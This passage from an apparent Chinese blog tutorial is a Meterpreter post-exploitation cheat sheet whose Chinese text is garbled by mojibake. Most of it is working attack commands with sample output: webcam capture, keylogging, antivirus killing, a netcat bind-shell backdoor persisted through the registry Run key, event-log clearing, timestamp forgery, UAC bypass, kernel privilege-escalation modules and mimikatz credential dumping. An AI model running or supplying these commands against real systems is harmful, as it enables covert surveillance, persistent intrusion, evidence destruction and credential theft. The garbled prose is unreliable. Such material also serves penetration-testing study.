class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># ä¼šè¯ç®¡ç†</span><br><span class="line">background  #å°†å½“å‰ä¼šè¯æ”¾ç½®åå°</span><br><span class="line">sessions  # æŸ¥çœ‹ä¼šè¯</span><br><span class="line">sessions -i  # åˆ‡æ¢ä¼šè¯</span><br><span class="line">quit  # å…³é—­å½“å‰çš„ä¼šè¯ï¼Œè¿”å›msfç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># ç³»ç»Ÿè®¾ç½®</span><br><span class="line">sysinfo  # æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯</span><br><span class="line">idletime  # æŸ¥çœ‹ç›®æ ‡æœºé—²ç½®æ—¶é—´</span><br><span class="line">reboot/shutdown   # é‡å¯/å…³æœº</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # è·å¾—æ§åˆ¶å°æƒé™</span><br><span class="line">irb  # è¿›å…¥rubyç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹è¿ç§»</span><br><span class="line">getpid    # è·å–å½“å‰è¿›ç¨‹çš„pid</span><br><span class="line">ps   # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line">kill &lt;pidå€¼&gt;   #æ€æ­»è¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’</span><br><span class="line"></span><br><span class="line"># æ‘„åƒå¤´å‘½ä»¤</span><br><span class="line">webcam_list  #æŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨</span><br><span class="line">webcam_chat  # æŸ¥çœ‹æ‘„åƒå¤´æ¥å£</span><br><span class="line">webcam_snap   #é€šè¿‡æ‘„åƒå¤´æ‹ç…§</span><br><span class="line">webcam_stream   #é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘</span><br><span class="line"></span><br><span class="line"># uictlå¼€å…³é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl disable mouse  #ç¦ç”¨é¼ æ ‡</span><br><span class="line">uictl disable keyboard  #ç¦ç”¨é”®ç›˜</span><br><span class="line"></span><br><span class="line"># è¿œç¨‹æ¡Œé¢/æˆªå±</span><br><span class="line">enumdesktops  #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢</span><br><span class="line">getdesktop    #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢</span><br><span class="line">screenshot  #æˆªå±</span><br><span class="line">use espia  #æˆ–è€…ä½¿ç”¨espiaæ¨¡å—æˆªå±  ç„¶åè¾“å…¥screengrab</span><br><span class="line">run vnc  #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥</span><br><span class="line"></span><br><span class="line"># é”®ç›˜è®°å½•</span><br><span class="line">keyscan_start  #å¼€å§‹é”®ç›˜è®°å½•</span><br><span class="line">keyscan_dump   #å¯¼å‡ºè®°å½•æ•°æ®</span><br><span class="line">keyscan_stop #ç»“æŸé”®ç›˜è®°å½•</span><br><span class="line"></span><br><span class="line"># æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line"># å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exe é€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤</span><br><span class="line">run post/windows/manage/enable_rdp  #å¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #æ·»åŠ ç”¨æˆ·</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #å°†3389ç«¯å£è½¬å‘åˆ°6662</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç—…æ¯’è½¯ä»¶</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹æ³¨å†Œè¡¨</span><br><span class="line">reg â€“h # æ³¨å†Œè¡¨å‘½ä»¤å¸®åŠ©</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #ä¸Šä¼ nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #æšä¸¾runä¸‹çš„key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #è®¾ç½®é”®å€¼</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #æŸ¥çœ‹é”®å€¼</span><br><span class="line">nc -v 192.168.81.162 443  #æ”»å‡»è€…è¿æ¥ncåé—¨</span><br><span class="line"></span><br><span class="line"># æ¸…ç†æ—¥å¿—</span><br><span class="line">clearav  #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-4"><a href="#4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-4" class="headerlink" title="4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # åŸºæœ¬å‘½ä»¤</span><br><span class="line">search -f *pass* -d C:\\windows # æœç´¢æ–‡ä»¶  -hæŸ¥çœ‹å¸®åŠ©</span><br><span class="line">getwd/pwd  # è·å–å½“å‰ç›®å½•</span><br><span class="line">getlwd/lpwd   # æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # ä¸‹è½½æ–‡ä»¶</span><br><span class="line">edit c:\\1.txt  # ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶</span><br><span class="line">mkdir lltest2  # åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</span><br><span class="line">rmdir lltest2  # åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹</span><br><span class="line">lcd /tmp   # æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•</span><br><span class="line"></span><br><span class="line"># timestompä¼ªé€ æ–‡ä»¶æ—¶é—´æˆ³</span><br><span class="line">timestomp C:// -h   #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³</span><br><span class="line">timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-ç½‘ç»œå‘½ä»¤-4"><a href="#4-3-ç½‘ç»œå‘½ä»¤-4" class="headerlink" title="4.3 ç½‘ç»œå‘½ä»¤"></a>4.3 ç½‘ç»œå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># åŸºæœ¬</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat â€“ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #æŸ¥çœ‹ä»£ç†ä¿¡æ¯</span><br><span class="line">route   #æŸ¥çœ‹è·¯ç”±</span><br><span class="line"></span><br><span class="line"># portfwdç«¯å£è½¬å‘</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #ç„¶åä½¿ç”¨rdesktopæ¥è¿æ¥ï¼Œ-u ç”¨æˆ·å -p å¯†ç </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ·»åŠ è·¯ç”±</span><br><span class="line"></span><br><span class="line"># æ–¹å¼ä¸€autoroute ï¼ˆdeprecatedï¼‰</span><br><span class="line">run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run autoroute -s 192.168.2.0/24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line"># æ–¹å¼äºŒpost/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #è‡ªåŠ¨æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run post/multi/manage/autoroute CMD=print # æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># ç„¶åå¯ä»¥åˆ©ç”¨arp_scannerã€portscanç­‰è¿›è¡Œæ‰«æ</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autorouteæ·»åŠ å®Œè·¯ç”±åï¼Œè¿˜å¯ä»¥åˆ©ç”¨msfè‡ªå¸¦çš„æ¨¡å—è¿›è¡Œsocksä»£ç†</span><br><span class="line"># msfæä¾›äº†2ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># å…ˆbackgroundé€€å‡ºæ¥ï¼Œç„¶åï¼š</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># ç„¶åvi /etc/proxychains.conf #æ·»åŠ  socks5 127.0.0.1 1080</span><br><span class="line"># æœ€åproxychains ä½¿ç”¨Socks5ä»£ç†è®¿é—®</span><br><span class="line"></span><br><span class="line"># snifferæŠ“åŒ…</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #æŸ¥çœ‹ç½‘å¡</span><br><span class="line">sniffer_start 2   #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…</span><br><span class="line">sniffer_stats 2   #æŸ¥çœ‹çŠ¶æ€</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #å¯¼å‡ºpcapæ•°æ®åŒ…</span><br><span class="line">sniffer_stop 2   #åœæ­¢æŠ“åŒ…</span><br></pre></td></tr></table></figure><h3 id="4-4-ä¿¡æ¯æ”¶é›†-4"><a href="#4-4-ä¿¡æ¯æ”¶é›†-4" class="headerlink" title="4.4 ä¿¡æ¯æ”¶é›†"></a>4.4 ä¿¡æ¯æ”¶é›†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ä¿¡æ¯æ”¶é›†çš„è„šæœ¬ä½äºï¼š</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># ä»¥ä¸‹åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„</span><br><span class="line">run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒº</span><br><span class="line">run post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯</span><br><span class="line">run post/windows/gather/dumplinks   #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ</span><br><span class="line">run post/windows/gather/enum_ie  #è·å–IEç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_chrome   #è·å–Chromeç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_patches  #è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_domain  #æŸ¥æ‰¾åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="4-5-ææƒ-4"><a href="#4-5-ææƒ-4" class="headerlink" title="4.5 ææƒ"></a>4.5 ææƒ</h3>1.getsystemææƒ<br>getsystemå·¥ä½œåŸç†ï¼š<br>â‘ getsystemåˆ›å»ºä¸€ä¸ªæ–°çš„WindowsæœåŠ¡ï¼Œè®¾ç½®ä¸ºSYSTEMè¿è¡Œï¼Œå½“å®ƒå¯åŠ¨æ—¶è¿æ¥åˆ°ä¸€ä¸ªå‘½åç®¡é“ã€‚<br>â‘¡getsystemäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶ç­‰å¾…æ¥è‡ªè¯¥æœåŠ¡çš„è¿æ¥ã€‚<br>â‘¢WindowsæœåŠ¡å·²å¯åŠ¨ï¼Œå¯¼è‡´ä¸å‘½åç®¡é“å»ºç«‹è¿æ¥ã€‚<br>â‘£è¯¥è¿›ç¨‹æ¥æ”¶è¿æ¥å¹¶è°ƒç”¨ImpersonateNamedPipeClientï¼Œä»è€Œä¸ºSYSTEMç”¨æˆ·åˆ›å»ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚<br>ç„¶åç”¨æ–°æ”¶é›†çš„SYSTEMæ¨¡æ‹Ÿä»¤ç‰Œäº§ç”Ÿcmd.exeï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªSYSTEMç‰¹æƒè¿›ç¨‹ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæœ‰åŠ©äºé˜²æ­¢å¯¹ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„æ›´æ”¹ã€‚åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚msfæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ¨¡å—å¸®åŠ©ç»•è¿‡UACï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œ<strong>éœ€è¦å†æ¬¡æ‰§è¡Œgetsystemè·å–ç³»ç»Ÿæƒé™</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># ç„¶åè¿”å›æ–°çš„meterpreterä¼šè¯ï¼Œç»§ç»­æ‰§è¡Œgetsystemæœ¬åº”è¯¥ä¼šææƒæˆåŠŸ</span><br><span class="line"># ç„¶é¹…è¿™é‡Œå¤±è´¥äº†</span><br></pre></td></tr></table></figure>3.å†…æ ¸æ¼æ´ææƒæ— è®ºæ˜¯linuxè¿˜æ˜¯windowséƒ½å‡ºè¿‡å¾ˆå¤šé«˜å±çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæƒé™æå‡ï¼Œæ¯”å¦‚windowsç³»ç»Ÿçš„ms13-081ã€ms15-051ã€ms16-032ã€ms17-010ç­‰ï¼Œmsfä¹Ÿé›†æˆäº†è¿™äº›æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># ç„¶é¹…å¤±è´¥äº†ï¼Œæ‘¸æ‘¸å¤´</span><br></pre></td></tr></table></figure><h3 id="4-6-è·å–å‡­è¯-4"><a href="#4-6-è·å–å‡­è¯-4" class="headerlink" title="4.6 è·å–å‡­è¯"></a>4.6 è·å–å‡­è¯</h3>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç®¡ç†å‘˜å¯èƒ½ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»–ä½¿ç”¨çš„å¯†ç æœ‰å¯èƒ½ç›¸åŒæˆ–è€…æœ‰è§„å¾‹ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°å¯†ç æˆ–è€…hashï¼Œå†å°è¯•ç™»å½•å†…ç½‘å…¶å®ƒæœåŠ¡å™¨ï¼Œå¯èƒ½å–å¾—æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚1.ä½¿ç”¨mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">wdigest  #è·å–Wdigestå¯†ç </span><br><span class="line">mimikatz_command -f samdump::hashes  #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as 